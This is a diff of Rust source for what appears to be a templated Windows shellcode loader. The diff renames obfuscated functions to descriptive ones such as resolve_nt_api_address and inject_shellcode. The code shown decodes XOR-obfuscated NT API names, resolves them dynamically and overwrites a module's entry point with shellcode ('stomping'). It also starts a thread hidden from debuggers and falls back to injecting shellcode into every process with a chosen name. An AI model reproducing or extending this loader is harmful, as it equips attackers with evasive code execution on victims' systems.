@@ -65,14 +65,14 @@ const OBF_D: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
 const OBF_E: &[u8] = &{{OBF_NT_CREATE_THREAD_EX}};
 const OBF_H: &[u8] = &{{OBF_NT_DELAY_EXECUTION}};
 
-fn r(d: &[u8]) -> Vec<u8> {
+fn deobfuscate_bytes(d: &[u8]) -> Vec<u8> {
     d.iter().map(|b| b ^ K).collect()
 }
 
-unsafe fn g(n: &[u8]) -> *const () {
+unsafe fn resolve_nt_api_address(n: &[u8]) -> *const () {
     let ntdll = CString::new(lc!("ntdll")).unwrap();
     let h = GetModuleHandleA(ntdll.as_ptr());
-    let s = r(n);
+    let s = deobfuscate_bytes(n);
     let c = CString::new(s).unwrap();
     GetProcAddress(h, c.as_ptr()) as *const ()
 }
@@ -92,7 +92,7 @@ struct CLIENT_ID {
 
 fn pause(ms: i64) {
     unsafe {
-        let f: FH = std::mem::transmute(g(OBF_H));
+        let f: FH = std::mem::transmute(resolve_nt_api_address(OBF_H));
         let interval: i64 = -(ms * 10_000);
         f(0, &interval);
     }
@@ -136,7 +136,7 @@ unsafe fn resolve_entry_point(base: usize) -> Option<*mut c_void> {
 }
 
 // Find PIDs whose process name matches `tar`.
-fn boxboxbox(tar: &str) -> Vec<usize> {
+fn find_process_ids_by_name(tar: &str) -> Vec<usize> {
     use sysinfo::System;
     let mut dom: Vec<usize> = Vec::new();
     let s = System::new_all();
@@ -169,7 +169,7 @@ unsafe fn stomp_local(buf: &mut Vec<u8>) -> Option<*mut c_void> {
     // The entry point sits inside a page that is RX (image). Flip it RW so we
     // can overwrite it, write the shellcode at the entry point, then restore
     // RX. The region stays file-backed (image), not MEM_PRIVATE RWX.
-    let f_protect: FD = std::mem::transmute(g(OBF_D));
+    let f_protect: FD = std::mem::transmute(resolve_nt_api_address(OBF_D));
     let mut region_base = entry_va;
     let mut region_size = buf_len;
     let mut old_protect: u32 = 0;
@@ -177,7 +177,7 @@ unsafe fn stomp_local(buf: &mut Vec<u8>) -> Option<*mut c_void> {
         return None;
     }
 
-    let f_write: FC = std::mem::transmute(g(OBF_C));
+    let f_write: FC = std::mem::transmute(resolve_nt_api_address(OBF_C));
     let mut written: usize = 0;
     let s = f_write(current_process, entry_va, buf.as_ptr() as *mut c_void, buf_len, &mut written);
     if !NT_SUCCESS(s) || written != buf_len {
@@ -199,7 +199,7 @@ unsafe fn stomp_local(buf: &mut Vec<u8>) -> Option<*mut c_void> {
     Some(entry_va)
 }
 
-fn enhance(mut buf: Vec<u8>, tar: usize) {
+fn inject_shellcode(mut buf: Vec<u8>, tar: usize) {
     let mut process_handle = tar as HANDLE;
     let mut oa = OBJECT_ATTRIBUTES::default();
     let mut ci = CLIENT_ID {
@@ -208,11 +208,11 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
     };
 
     unsafe {
-        let f_open: FA = std::mem::transmute(g(OBF_A));
-        let f_alloc: FB = std::mem::transmute(g(OBF_B));
-        let f_write: FC = std::mem::transmute(g(OBF_C));
-        let f_protect: FD = std::mem::transmute(g(OBF_D));
-        let f_thread: FE = std::mem::transmute(g(OBF_E));
+        let f_open: FA = std::mem::transmute(resolve_nt_api_address(OBF_A));
+        let f_alloc: FB = std::mem::transmute(resolve_nt_api_address(OBF_B));
+        let f_write: FC = std::mem::transmute(resolve_nt_api_address(OBF_C));
+        let f_protect: FD = std::mem::transmute(resolve_nt_api_address(OBF_D));
+        let f_thread: FE = std::mem::transmute(resolve_nt_api_address(OBF_E));
 
         let s = f_open(&mut process_handle, PROCESS_ALL_ACCESS, &mut oa, &mut ci);
         if !NT_SUCCESS(s) {
@@ -268,7 +268,7 @@ fn main() {
     // thread created with HIDE_FROM_DEBUGGER.
     unsafe {
         if let Some(entry_va) = stomp_local(&mut vec) {
-            let f_thread: FE = std::mem::transmute(g(OBF_E));
+            let f_thread: FE = std::mem::transmute(resolve_nt_api_address(OBF_E));
             let mut th: HANDLE = null_mut();
             let current_process: HANDLE = -1isize as HANDLE;
             f_thread(&mut th, THREAD_ALL_ACCESS, null_mut(), current_process, entry_va, null_mut(), HIDE_FROM_DEBUGGER, 0, 0, 0, null_mut());
@@ -284,10 +284,10 @@ fn main() {
 
     // Fallback to remote injection into the target process if local stomping
     // failed (e.g. amsi.dll unavailable).
-    let list: Vec<usize> = boxboxbox(&tar);
+    let list: Vec<usize> = find_process_ids_by_name(&tar);
     if !list.is_empty() {
         for i in &list {
-            enhance(vec.clone(), *i);
+            inject_shellcode(vec.clone(), *i);
         }
         pause(60_000);
     }
